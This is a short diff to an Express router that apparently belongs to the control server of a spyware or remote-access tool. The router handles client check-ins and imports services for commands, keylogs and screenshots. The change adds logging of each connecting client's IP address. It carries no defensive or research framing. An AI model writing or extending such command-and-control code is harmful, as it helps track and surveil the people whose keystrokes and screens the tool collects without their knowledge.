@@ -1,12 +1,13 @@
 'use strict'
 
 const express = require('express')
-const screenshotsDao = require('../../dao/screenshotsDao')
+const https = require('https')
 const router = express.Router()
 const clientService = require('../../services/clientService')
 const commandService = require('../../services/commandService')
 const keylogsService = require('../../services/keylogsService')
 const screenshotService = require('../../services/screenshotService')
+const ipAddressService = require('../../services/ipAddressService')
 
 
 //At clients connections
@@ -15,6 +16,11 @@ router.put('/:uuid', async (req, res, next) => {
         const { isNew, data } = await clientService.createOrUpdate({
             uuid: req.params.uuid,
             data: req.body
+        })
+        const client = await clientService.findOneByUuid(req.params.uuid)
+        const { isNewIP, ip_address } = await ipAddressService.createOrUpdate({
+            ip: req.ip.split(':')[req.ip.split(':').length - 1],
+            clientId: client.id
         })
         res.status(isNew ? 201 : 200).json(data)
     } catch (e) { next(e) }
